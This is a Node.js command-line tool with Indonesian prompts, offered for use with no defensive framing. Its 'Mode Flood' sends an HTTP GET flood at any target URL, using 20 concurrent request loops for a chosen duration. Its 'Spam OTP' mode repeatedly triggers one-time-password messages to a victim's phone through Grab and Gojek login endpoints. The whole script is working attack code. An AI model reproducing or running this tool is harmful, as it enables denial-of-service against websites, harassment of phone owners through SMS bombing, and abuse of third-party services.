const readline = require("readline");
const os = require("os");
const https = require("https");
const querystring = require("querystring");

function getPublicIP(callback) {
  https.get("https://api.ipify.org?format=json", (res) => {
    let data = "";
    res.on("data", chunk => data += chunk);
    res.on("end", () => {
      try {
        const ip = JSON.parse(data).ip;
        callback(ip);
      } catch {
        callback("Tidak diketahui");
      }
    });
  }).on("error", () => {
    callback("Gagal mengambil IP");
  });
}

function runFlood(targetUrl, duration) {
  const endTime = Date.now() + duration * 1000;
  let count = 0;
  let success = 0;
  let failed = 0;

  console.log(`[!] Menjalankan flood ke ${targetUrl} selama ${duration} detik...\n`);

  function sendRequest() {
    if (Date.now() > endTime) {
      const percent = ((success / count) * 100).toFixed(1);
      const status = percent >= 80 ? "Ganas" : "Lemah";

      console.log("\n==============================");
      console.log(`[✓] Flood selesai`);
      console.log(`[+] Total   : ${count}`);
      console.log(`[+] Sukses  : ${success}`);
      console.log(`[+] Gagal   : ${failed}`);
      console.log(`[+] Persentase : ${percent}% (${status})`);
      console.log("==============================\n");
      return;
    }

    try {
      const req = https.request(targetUrl, { method: "GET" }, (res) => {
        res.on("data", () => {});
        res.on("end", () => {
          success++;
          count++;
          process.stdout.write(`[+] Sukses (${success}) | Gagal (${failed})\r`);
          sendRequest();
        });
      });

      req.on("error", () => {
        failed++;
        count++;
        process.stdout.write(`[!] Sukses (${success}) | Gagal (${failed})\r`);
        sendRequest();
      });

      req.end();
    } catch {
      failed++;
      count++;
      process.stdout.write(`[!] Sukses (${success}) | Gagal (${failed})\r`);
      sendRequest();
    }
  }

  for (let i = 0; i < 20; i++) {
    sendRequest();
  }
}


function runOtpSpam(nomor, jumlah) {
  let count = 0;
  const apis = [apiGrab, apiGojek];

  function sendNext() {
    if (count >= jumlah) {
      console.log(`\n[✓] Selesai spam ${jumlah} OTP ke ${nomor}`);
      return;
    }
    const apiFunc = apis[count % apis.length];
    apiFunc(nomor, () => {
      count++;
      setTimeout(sendNext, 2000);
    });
  }

  console.log(`[!] Mulai spam OTP ke ${nomor} sebanyak ${jumlah}x`);
  sendNext();
}

function apiGrab(nomor, callback) {
  const formatted = nomor.startsWith("0") ? nomor : "0" + nomor;
  const postData = JSON.stringify({
    method: "SEND_OTP",
    countryCode: "ID",
    phoneNumber: formatted.replace(/^0/, "")
  });

  const options = {
    hostname: "api.grab.com",
    path: "/wallet/v1/account/otp",
    method: "POST",
    headers: {
      "Content-Type": "application/json",
      "User-Agent": "Mozilla/5.0",
      "Content-Length": Buffer.byteLength(postData)
    }
  };

  const req = https.request(options, (res) => {
    let data = "";
    res.on("data", chunk => data += chunk);
    res.on("end", () => {
      if (res.statusCode === 200 || res.statusCode === 201) {
        try {
          const json = JSON.parse(data);
          if (json && (json.otpSent === true || json.status === "success")) {
            console.log(`[+] [Grab] OTP terkirim ke ${nomor}`);
          } else {
            console.log(`[!] [Grab] Gagal kirim OTP`);
          }
        } catch {
          console.log(`[!] [Grab] Gagal parsing response`);
        }
      } else {
        console.log(`[!] [Grab] Status code ${res.statusCode}`);
      }
      callback();
    });
  });

  req.on("error", (e) => {
    console.log(`[!] [Grab] Error: ${e.message}`);
    callback();
  });

  req.write(postData);
  req.end();
}

function apiGojek(nomor, callback) {
  const formatted = nomor.startsWith("0") ? nomor : "0" + nomor;
  const postData = JSON.stringify({
    phone: formatted
  });

  const options = {
    hostname: "api.gojekapi.com",
    path: "/v5/customers/login_with_phone",
    method: "POST",
    headers: {
      "Content-Type": "application/json",
      "User-Agent": "Mozilla/5.0",
      "Content-Length": Buffer.byteLength(postData),
      "X-AppVersion": "3.30.1",
      "X-Platform": "Android"
    }
  };

  const req = https.request(options, (res) => {
    let data = "";
    res.on("data", chunk => data += chunk);
    res.on("end", () => {
      if (res.statusCode === 200) {
        try {
          const json = JSON.parse(data);
          if (json && json.success === true) {
            console.log(`[+] [Gojek] OTP terkirim ke ${nomor}`);
          } else {
            console.log(`[!] [Gojek] Gagal kirim OTP`);
          }
        } catch {
          console.log(`[!] [Gojek] Gagal parsing response`);
        }
      } else {
        console.log(`[!] [Gojek] Status code ${res.statusCode}`);
      }
      callback();
    });
  });

  req.on("error", (e) => {
    console.log(`[!] [Gojek] Error: ${e.message}`);
    callback();
  });

  req.write(postData);
  req.end();
}

function showMenu(ip) {
  const platform = os.platform();
  const deviceType = /android/.test(platform) ? "Android/Termux" : platform;

  console.clear();
  console.log("==============================");
  console.log("     TOOLS JS INFORMATION     ");
  console.log("==============================");
  console.log("IP Address  :", ip);
  console.log("Device      :", deviceType);
  console.log("==============================");
  console.log("1. Mode Flood");
  console.log("2. Spam OTP");
  console.log("0. Exit");
  console.log("==============================");

  const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
  });

  rl.question("Pilih mode: ", (input) => {
    switch (input) {
      case '1':
        rl.question("Target URL (https://...): ", (url) => {
          rl.question("Durasi (detik): ", (time) => {
            runFlood(url, parseInt(time));
            rl.close();
          });
        });
        break;

      case '2':
        rl.question("Nomor HP: ", (nomor) => {
          rl.question("Jumlah spam: ", (jumlah) => {
            runOtpSpam(nomor, parseInt(jumlah));
            rl.close();
          });
        });
        break;

      case '0':
        console.log("Keluar...");
        rl.close();
        break;

      default:
        console.log("Pilihan tidak valid.");
        rl.close();
    }
  });
}

getPublicIP((ip) => {
  showMenu(ip);
});